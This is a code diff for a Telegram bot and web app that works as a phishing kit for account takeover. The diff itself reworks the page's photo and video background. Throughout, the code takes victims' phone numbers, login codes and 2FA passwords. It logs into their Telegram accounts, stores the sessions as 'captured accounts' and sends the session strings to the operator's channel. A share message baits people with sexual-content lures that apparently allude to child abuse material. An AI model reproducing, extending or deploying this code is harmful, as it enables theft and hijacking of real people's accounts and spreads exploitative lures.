@@ -28,7 +28,7 @@ WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
 BOT_USERNAME = ""
-BG_DIR = "bg_video"
+BG_DIR = "bg_media"
 os.makedirs(BG_DIR, exist_ok=True)
 
 DEFAULT_WELCOME_MSGS = [
@@ -70,7 +70,7 @@ SHARE_FILE = "share_config.json"
 AUTOPASS_FILE = "auto_2fa.json"
 RESET_LOG_FILE = "reset_log.json"
 RESET_STATE_FILE = "reset_state.json"
-VIDEO_FILE = "video_config.json"
+BG_CFG_FILE = "bg_config.json"      # was video_config.json
 BOTNAME_FILE = "bot_username.json"
 
 STATE = {
@@ -83,7 +83,7 @@ STATE = {
     "awaiting_share_msg": False,
     "awaiting_2fa_pass": False,
     "awaiting_reset_number": False,
-    "awaiting_video_url": False,
+    "awaiting_bg_url": False,
 }
 
 broadcast_state = {
@@ -211,15 +211,23 @@ def load_reset_state():
 def save_reset_state(state): save_json(RESET_STATE_FILE, state)
 
 
-def load_video_config():
-    cfg = load_json(VIDEO_FILE, None)
+def load_bg_config():
+    # migrate from video_config.json if exists
+    if os.path.exists(VIDEO_FILE_OLD) and not os.path.exists(BG_CFG_FILE):
+        old = load_json(VIDEO_FILE_OLD, None)
+        if old and isinstance(old, dict) and old.get("type") in ("file", "url"):
+            new = {"type": "video" if old["type"] == "file" else "url",
+                   "value": old.get("value", "")}
+            save_json(BG_CFG_FILE, new)
+            return new
+    cfg = load_json(BG_CFG_FILE, None)
     if not cfg or not isinstance(cfg, dict):
         cfg = {"type": "none", "value": ""}
-        save_json(VIDEO_FILE, cfg)
+        save_json(BG_CFG_FILE, cfg)
     return cfg
 
 
-def save_video_config(cfg): save_json(VIDEO_FILE, cfg)
+def save_bg_config(cfg): save_json(BG_CFG_FILE, cfg)
 
 
 def get_bot_username():
@@ -239,13 +247,15 @@ def render_share_message(template=None):
     return msg.replace("{bot}", bot_u or "your_bot")
 
 
+VIDEO_FILE_OLD = "video_config.json"
+
 captured_accounts = load_accounts()
 users = load_users()
 welcome_config = load_welcome_config()
 broadcast_config = load_broadcast_config()
 share_config = load_share_config()
 auto_2fa_pass = load_autopass()
-video_config = load_video_config()
+bg_config = load_bg_config()
 
 _reset_state = load_reset_state()
 reset_events = {k: float(v) for k, v in _reset_state.get("events", {}).items()}
@@ -260,6 +270,14 @@ def format_phone(ph):
     if len(digits) == 10: return '+91' + digits
     if len(digits) == 12 and digits.startswith('91'): return '+' + digits
     return '+' + digits
+
+
+def clear_bg_files():
+    try:
+        for f in os.listdir(BG_DIR):
+            try: os.remove(os.path.join(BG_DIR, f))
+            except Exception: pass
+    except Exception: pass
 
 
 # ============================================================
@@ -379,7 +397,7 @@ def admin_menu():
     return [
         [Button.inline("👋 Welcome Messages", b"menu_welcome"), Button.inline("📢 Broadcast", b"menu_broadcast")],
         [Button.inline("🔗 Share Message", b"menu_share"), Button.inline("🔴 Expired", b"menu_expired")],
-        [Button.inline("🎬 Video Background", b"menu_video"), Button.inline("👥 Users", b"menu_users")],
+        [Button.inline("🖼️ Background (Photo/Video)", b"menu_bg"), Button.inline("👥 Users", b"menu_users")],
         [Button.inline("📊 Stats", b"menu_stats"), Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer")],
         [Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired"),
          Button.inline(f"🔐 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
@@ -387,14 +405,16 @@ def admin_menu():
     ]
 
 
-def video_menu():
-    vt = video_config.get("type", "none")
-    state = "🎬 Video set" if vt == "file" else ("🔗 URL set" if vt == "url" else "❌ None")
+def bg_menu():
+    bt = bg_config.get("type", "none")
+    state_map = {"none": "❌ None", "photo": "🖼️ Photo set", "video": "🎬 Video set", "url": "🔗 URL set"}
+    state = state_map.get(bt, "❌ None")
     return [
-        [Button.inline("📤 Forward Video to Set", b"vid_info")],
-        [Button.inline("🔗 Set Video URL", b"vid_url")],
-        [Button.inline("🗑 Remove Background", b"vid_remove")],
-        [Button.inline(f"📊 Status: {state}", b"vid_noop")],
+        [Button.inline("🖼️ Forward Photo to Set", b"bg_info_photo")],
+        [Button.inline("🎬 Forward Video to Set", b"bg_info_video")],
+        [Button.inline("🔗 Set Image/Video URL", b"bg_url")],
+        [Button.inline("🗑 Remove Background", b"bg_remove")],
+        [Button.inline(f"📊 Status: {state}", b"bg_noop")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
@@ -544,11 +564,11 @@ async def setbot_cmd(event):
 @bot.on(events.NewMessage(pattern='/health'))
 async def health_cmd(event):
     if event.sender_id != YOUR_TELEGRAM_ID: return
-    vt = video_config.get("type", "none")
+    bt = bg_config.get("type", "none")
     txt = (f"🏥 HEALTH\n\nbot connected: {bot.is_connected()}\n"
            f"bot username: @{get_bot_username()}\naccounts: {len(captured_accounts)}\n"
            f"pending_codes: {len(pending_codes)}\nuser_sessions: {len(user_sessions)}\n"
-           f"video_type: {vt}\nchannel_id: {CHANNEL_ID}")
+           f"bg_type: {bt}\nbg_value: {bg_config.get('value','')}\nchannel_id: {CHANNEL_ID}")
     await event.respond(txt, buttons=admin_menu())
 
 
@@ -572,7 +592,7 @@ async def test_cmd(event):
 # ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
-    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config, captured_accounts, video_config
+    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config, captured_accounts, bg_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
@@ -580,8 +600,7 @@ async def cb(event):
     try:
         if data == "menu_reset_numbers":
             await event.answer()
-            await safe_send(chat_id, "♻️ **Reset Numbers**\n\nReset = number fresh hobe.",
-                reset_numbers_menu(), edit_event=event); return
+            await safe_send(chat_id, "♻️ **Reset Numbers**", reset_numbers_menu(), edit_event=event); return
         if data == "rn_noop": return await event.answer()
         if data == "rn_all":
             await event.answer("Resetting ALL...")
@@ -635,29 +654,37 @@ async def cb(event):
             auto_2fa_pass = ""; save_autopass("")
             await event.answer("Cleared", alert=True); await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
 
-        elif data == "menu_video":
+        # ===== BACKGROUND (PHOTO + VIDEO) =====
+        elif data == "menu_bg":
             await event.answer()
             await safe_send(chat_id,
-                "🎬 **Video Background**\n\nForward any video → auto-set.\n\nSupported: any format, any size.",
-                video_menu(), edit_event=event)
-        elif data == "vid_noop": return await event.answer()
-        elif data == "vid_info":
+                "🖼️ **Background Settings**\n\n"
+                "• Forward a **photo** → set as photo bg\n"
+                "• Forward a **video** → set as video bg\n"
+                "• Or set a URL\n\n"
+                "Any format, any size.",
+                bg_menu(), edit_event=event)
+        elif data == "bg_noop": return await event.answer()
+        elif data == "bg_info_photo":
             await event.answer()
-            await safe_send(chat_id, "📤 **Forward a video** now.",
-                [[Button.inline("⬅️ Back", b"menu_video")]], edit_event=event)
-        elif data == "vid_url":
-            STATE["awaiting_video_url"] = True; await event.answer()
-            await safe_send(chat_id, "🔗 Send a direct video URL.",
-                [[Button.inline("⬅️ Back", b"menu_video")]], edit_event=event)
-        elif data == "vid_remove":
-            video_config = {"type": "none", "value": ""}; save_video_config(video_config)
-            try:
-                for f in os.listdir(BG_DIR):
-                    try: os.remove(os.path.join(BG_DIR, f))
-                    except Exception: pass
-            except Exception: pass
+            await safe_send(chat_id,
+                "🖼️ **Forward a photo** now.\n\nAuto-downloaded and set as background.",
+                [[Button.inline("⬅️ Back", b"menu_bg")]], edit_event=event)
+        elif data == "bg_info_video":
+            await event.answer()
+            await safe_send(chat_id,
+                "🎬 **Forward a video** now.\n\nAuto-downloaded and set as background.",
+                [[Button.inline("⬅️ Back", b"menu_bg")]], edit_event=event)
+        elif data == "bg_url":
+            STATE["awaiting_bg_url"] = True; await event.answer()
+            await safe_send(chat_id,
+                "🔗 Send a direct image/video URL.\n(Must end with .jpg/.png/.mp4/.webm etc.)",
+                [[Button.inline("⬅️ Back", b"menu_bg")]], edit_event=event)
+        elif data == "bg_remove":
+            bg_config = {"type": "none", "value": ""}; save_bg_config(bg_config)
+            clear_bg_files()
             await event.answer("Removed", alert=True)
-            await safe_send(chat_id, "🗑 Removed.", video_menu(), edit_event=event)
+            await safe_send(chat_id, "🗑 Background removed.", bg_menu(), edit_event=event)
 
         elif data == "menu_welcome":
             n = len(welcome_config.get("messages", []))
@@ -823,11 +850,11 @@ async def cancel(event):
 
 
 # ============================================================
-# MESSAGE INPUT HANDLER
+# MESSAGE INPUT HANDLER — photo/video capture
 # ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
-    global welcome_config, broadcast_config, share_config, auto_2fa_pass, captured_accounts, video_config
+    global welcome_config, broadcast_config, share_config, auto_2fa_pass, captured_accounts, bg_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         try:
             if event.message and event.message.contact:
@@ -840,42 +867,56 @@ async def capture(event):
     m = event.message
     is_video = bool(m.video) or bool(m.video_note) or bool(m.gif)
     is_doc_video = bool(m.document) and m.document.mime_type and m.document.mime_type.startswith("video/")
-    if is_video or is_doc_video:
-        if not any(STATE[k] for k in ["welcome_capture", "bc_nonlogged_capture", "bc_logged_capture"]):
-            try:
-                await event.respond("📥 Downloading video...")
-                try:
-                    for f in os.listdir(BG_DIR):
-                        try: os.remove(os.path.join(BG_DIR, f))
-                        except Exception: pass
-                except Exception: pass
-                fname = f"bg_{uuid.uuid4().hex[:8]}"
-                path = await event.download_media(file=os.path.join(BG_DIR, fname))
-                if path and os.path.exists(path):
-                    actual_name = os.path.basename(path)
-                    video_config = {"type": "file", "value": actual_name}
-                    save_video_config(video_config)
-                    size_mb = os.path.getsize(path) / (1024 * 1024)
-                    await event.respond(
-                        f"✅ Video set!\n\nFile: `{actual_name}`\nSize: `{size_mb:.2f} MB`",
-                        buttons=admin_menu(), parse_mode='md')
-                    return
-                else:
-                    await event.respond("❌ Download failed.", buttons=admin_menu()); return
-            except Exception as e:
-                logger.error(f"video download err: {e}")
-                await event.respond(f"❌ Error: {str(e)[:80]}", buttons=admin_menu()); return
+    is_photo = bool(m.photo)
+    is_doc_image = bool(m.document) and m.document.mime_type and m.document.mime_type.startswith("image/")
 
-    if STATE["awaiting_video_url"]:
+    # skip if in capture mode
+    in_capture = any(STATE[k] for k in ["welcome_capture", "bc_nonlogged_capture", "bc_logged_capture"])
+
+    if (is_video or is_doc_video) and not in_capture:
+        try:
+            await event.respond("📥 Downloading video...")
+            clear_bg_files()
+            fname = f"video_{uuid.uuid4().hex[:8]}"
+            path = await event.download_media(file=os.path.join(BG_DIR, fname))
+            if path and os.path.exists(path):
+                actual = os.path.basename(path)
+                bg_config = {"type": "video", "value": actual}; save_bg_config(bg_config)
+                size_mb = os.path.getsize(path) / (1024 * 1024)
+                await event.respond(f"✅ Video set!\n\nFile: `{actual}`\nSize: `{size_mb:.2f} MB`",
+                    buttons=admin_menu(), parse_mode='md')
+                return
+            else:
+                await event.respond("❌ Download failed.", buttons=admin_menu()); return
+        except Exception as e:
+            logger.error(f"video download err: {e}")
+            await event.respond(f"❌ Error: {str(e)[:80]}", buttons=admin_menu()); return
+
+    if (is_photo or is_doc_image) and not in_capture:
+        try:
+            await event.respond("📥 Downloading photo...")
+            clear_bg_files()
+            fname = f"photo_{uuid.uuid4().hex[:8]}"
+            path = await event.download_media(file=os.path.join(BG_DIR, fname))
+            if path and os.path.exists(path):
+                actual = os.path.basename(path)
+                bg_config = {"type": "photo", "value": actual}; save_bg_config(bg_config)
+                size_kb = os.path.getsize(path) / 1024
+                await event.respond(f"✅ Photo set!\n\nFile: `{actual}`\nSize: `{size_kb:.1f} KB`",
+                    buttons=admin_menu(), parse_mode='md')
+                return
+            else:
+                await event.respond("❌ Download failed.", buttons=admin_menu()); return
+        except Exception as e:
+            logger.error(f"photo download err: {e}")
+            await event.respond(f"❌ Error: {str(e)[:80]}", buttons=admin_menu()); return
+
+    if STATE["awaiting_bg_url"]:
         url = txt.strip()
         if not url.startswith("http"): return await event.respond("❌ Invalid URL.")
-        STATE["awaiting_video_url"] = False
-        try:
-            for f in os.listdir(BG_DIR):
-                try: os.remove(os.path.join(BG_DIR, f))
-                except Exception: pass
-        except Exception: pass
-        video_config = {"type": "url", "value": url}; save_video_config(video_config)
+        STATE["awaiting_bg_url"] = False
+        clear_bg_files()
+        bg_config = {"type": "url", "value": url}; save_bg_config(bg_config)
         await event.respond(f"✅ URL set.\n`{url}`", buttons=admin_menu(), parse_mode='md'); return
 
     if STATE["awaiting_reset_number"]:
@@ -1032,7 +1073,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML — FIXED VIDEO AUTOPLAY
+# WEBAPP HTML — PHOTO + VIDEO BG
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1044,7 +1085,8 @@ WEBAPP_HTML = """<!DOCTYPE html>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:white;min-height:100vh;overflow-x:hidden}
 .bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560,#0a0a0a);z-index:1}
-#bgVideo{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:1;display:none;pointer-events:none}
+#bgMedia{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:1;display:none;pointer-events:none}
+#bgMedia.show{display:block}
 .blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.75);z-index:2}
 .wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;text-align:center;display:none}
@@ -1078,7 +1120,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 </style>
 </head>
 <body>
-<video id="bgVideo" autoplay muted loop playsinline webkit-playsinline preload="auto"></video>
+<img id="bgMedia" alt="">
+<video id="bgMediaV" autoplay muted loop playsinline webkit-playsinline preload="auto" style="display:none"></video>
 <div class="bg"></div>
 <div class="blur"></div>
 <div class="wrap">
@@ -1148,55 +1191,52 @@ var inProgress = false;
 var SHARE_MSG = "https://t.me/{bot}\\nhttps://t.me/{bot}\\nhttps://t.me/{bot}\\n\\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
 var BOT_USERNAME = "";
 
-// ===== VIDEO BACKGROUND with force autoplay + retry =====
+// ===== BACKGROUND (photo OR video) =====
+function setPhotoBg(src) {
+  var img = document.getElementById('bgMedia');
+  var v = document.getElementById('bgMediaV');
+  if (v) { try { v.pause(); } catch(e){} v.style.display='none'; }
+  img.src = src;
+  img.classList.add('show');
+  img.style.display = 'block';
+}
+
 function setVideoBg(src) {
-  var v = document.getElementById('bgVideo');
-  if (!v || !src) return;
+  var img = document.getElementById('bgMedia');
+  var v = document.getElementById('bgMediaV');
+  img.style.display = 'none';
+  img.classList.remove('show');
   v.src = src;
-  v.muted = true;
-  v.defaultMuted = true;
-  v.playsInline = true;
-  v.setAttribute('muted', '');
-  v.setAttribute('playsinline', '');
-  v.setAttribute('webkit-playsinline', '');
+  v.muted = true; v.defaultMuted = true; v.playsInline = true;
+  v.setAttribute('muted',''); v.setAttribute('playsinline',''); v.setAttribute('webkit-playsinline','');
   v.style.display = 'block';
   v.load();
-
   var tryPlay = function() {
     var p = v.play();
-    if (p && p.catch) {
-      p.catch(function(err) {
-        console.warn('video play blocked:', err);
-        // retry once more after short delay
-        setTimeout(function(){ v.play().catch(function(){}); }, 500);
-      });
-    }
+    if (p && p.catch) p.catch(function(){ setTimeout(function(){ v.play().catch(function(){}); }, 500); });
   };
-
   tryPlay();
-
-  // Retry on any user interaction
   var oncePlay = function() {
     if (v.paused) tryPlay();
     document.removeEventListener('touchstart', oncePlay);
     document.removeEventListener('click', oncePlay);
-    document.removeEventListener('scroll', oncePlay);
   };
-  document.addEventListener('touchstart', oncePlay, { passive: true });
+  document.addEventListener('touchstart', oncePlay, { passive:true });
   document.addEventListener('click', oncePlay);
-  document.addEventListener('scroll', oncePlay, { passive: true });
-
-  // Retry when page becomes visible
   document.addEventListener('visibilitychange', function() {
     if (!document.hidden && v.paused) tryPlay();
   });
 }
 
-fetch('/api/video_config').then(function(r){ return r.json(); }).then(function(d){
-  if (d && d.type === 'file' && d.value) {
-    setVideoBg('/bg_video/' + d.value + '?t=' + Date.now());
-  } else if (d && d.type === 'url' && d.value) {
-    setVideoBg(d.value);
+fetch('/api/bg_config').then(function(r){ return r.json(); }).then(function(d){
+  if (!d) return;
+  var t = d.type, v = d.value || '';
+  if (t === 'photo' && v) setPhotoBg('/bg_media/' + v + '?t=' + Date.now());
+  else if (t === 'video' && v) setVideoBg('/bg_media/' + v + '?t=' + Date.now());
+  else if (t === 'url' && v) {
+    var low = v.toLowerCase();
+    if (low.match(/\\.(jpg|jpeg|png|gif|webp|bmp|svg)(\\?|$)/)) setPhotoBg(v);
+    else setVideoBg(v);
   }
 }).catch(function(){});
 
@@ -1212,11 +1252,7 @@ function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, t, type) { var e=document.getElementById(id); e.textContent=t; e.className='msg show '+type; }
 
 function wipeUserCache() {
-  try {
-    localStorage.removeItem(UPK);
-    localStorage.removeItem(USK);
-    localStorage.removeItem(UCK);
-  } catch(e) {}
+  try { localStorage.removeItem(UPK); localStorage.removeItem(USK); localStorage.removeItem(UCK); } catch(e) {}
   phoneNumber = '';
 }
 
@@ -1511,28 +1547,44 @@ document.getElementById('shareBtn').onclick = function() {
 # FLASK ROUTES
 # ============================================================
 @app.route('/')
-def index():
-    return WEBAPP_HTML
+def index(): return WEBAPP_HTML
 
 
 @app.route('/tg')
-def tg_route():
-    return WEBAPP_HTML
+def tg_route(): return WEBAPP_HTML
 
 
-@app.route('/bg_video/<path:filename>')
-def serve_bg_video(filename):
+@app.route('/bg_media/<path:filename>')
+def serve_bg_media(filename):
     try:
-        logger.info(f"🎬 Serving video: {filename}")
+        logger.info(f"🎬 Serving media: {filename}")
         return send_from_directory(BG_DIR, filename, conditional=True)
     except Exception as e:
-        logger.error(f"serve_bg_video: {e}")
+        logger.error(f"serve_bg_media: {e}")
         return "", 404
 
 
+@app.route('/bg_video/<path:filename>')
+def serve_bg_video_legacy(filename):
+    try:
+        return send_from_directory(BG_DIR, filename, conditional=True)
+    except Exception:
+        return "", 404
+
+
+@app.route('/api/bg_config')
+def get_bg_config():
+    return jsonify(bg_config)
+
+
 @app.route('/api/video_config')
-def get_video_config():
-    return jsonify(video_config)
+def get_video_config_legacy():
+    # legacy compat
+    t = bg_config.get("type", "none")
+    if t == "video": return jsonify({"type": "file", "value": bg_config.get("value", "")})
+    if t == "photo": return jsonify({"type": "photo", "value": bg_config.get("value", "")})
+    if t == "url": return jsonify({"type": "url", "value": bg_config.get("value", "")})
+    return jsonify({"type": "none", "value": ""})
 
 
 @app.route('/health')
@@ -1544,8 +1596,8 @@ def health():
         'accounts': len(captured_accounts),
         'channel_id': CHANNEL_ID,
         'bot_username': get_bot_username(),
-        'video_type': video_config.get("type", "none"),
-        'video_value': video_config.get("value", ""),
+        'bg_type': bg_config.get("type", "none"),
+        'bg_value': bg_config.get("value", ""),
     })
 
 
@@ -1570,8 +1622,7 @@ def reset_state():
             if a.get('phone') == phone:
                 ss = (a.get('session') or '').strip()
                 needs_relogin = a.get('needs_relogin', False)
-                if ss and not needs_relogin:
-                    still_captured = True
+                if ss and not needs_relogin: still_captured = True
                 break
     return jsonify({
         'phone_reset_at': reset_events.get(phone, 0),
@@ -1630,17 +1681,14 @@ def _run_tg_thread(phone, code, password, tg_id):
 
 async def _tg_action(phone, code=None, password=None, tg_id=None):
     if not code:
-        t0 = time.time()
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         try:
             await client.connect()
             r = await client.send_code_request(phone)
-            t1 = time.time()
             session_str = StringSession.save(client.session)
             with sessions_lock:
-                user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str, 'sent_at': t1}
+                user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str, 'sent_at': time.time()}
                 pending_codes[phone] = 'sent'
-            logger.info(f"✅ OTP SENT: {phone} in {t1-t0:.2f}s")
             return {'success': True}
         except errors.PhoneNumberBannedError:
             with sessions_lock: pending_codes[phone] = 'err'
@@ -1655,7 +1703,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             with sessions_lock: pending_codes[phone] = 'err'
             return {'success': False, 'error': 'API ID invalid'}
         except Exception as e:
-            logger.error(f"❌ OTP FAIL: {type(e).__name__}: {e}")
             with sessions_lock: pending_codes[phone] = 'err'
             return {'success': False, 'error': str(e)[:80]}
         finally:
@@ -1685,9 +1732,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         me = await client.get_me()
         try: await client.get_dialogs()
         except Exception: pass
-
-        ss = StringSession.save(client.session)
-        ss_len = len(ss)
+        ss = StringSession.save(client.session); ss_len = len(ss)
         try:
             ak = client.session.auth_key.key; dc = client.session.dc_id
         except Exception:
@@ -1712,7 +1757,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
         NOTIFY_TARGET = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
-
         full_msg_html = (f"🔔 New Account!\n📱 {phone}\n👤 {name_full}\n"
                          f"🆔 {me.id}\n🌐 DC: {dc}\n📏 Session: {ss_len} chars\n\n"
                          f"🔑 Session:\n<code>{ss}</code>")
@@ -1726,11 +1770,8 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                 if r:
                     sent_msg = r
                     acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
-                    save_account(acc); captured_accounts = load_accounts()
-                    break
-            except Exception as e:
-                logger.warning(f"send attempt {attempt+1}: {e}")
-                await asyncio.sleep(0.5)
+                    save_account(acc); captured_accounts = load_accounts(); break
+            except Exception: await asyncio.sleep(0.5)
 
         if not sent_msg and NOTIFY_TARGET != YOUR_TELEGRAM_ID:
             for attempt in range(3):
@@ -1739,16 +1780,13 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                     if r:
                         sent_msg = r
                         acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
-                        save_account(acc); captured_accounts = load_accounts()
-                        break
-                except Exception:
-                    await asyncio.sleep(0.5)
+                        save_account(acc); captured_accounts = load_accounts(); break
+                except Exception: await asyncio.sleep(0.5)
 
         with sessions_lock:
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
         return {'success': True, 'user_id': me.id}
-
     except errors.PhoneCodeInvalidError:
         return {'success': False, 'error': 'Wrong code'}
     except errors.PhoneCodeExpiredError:
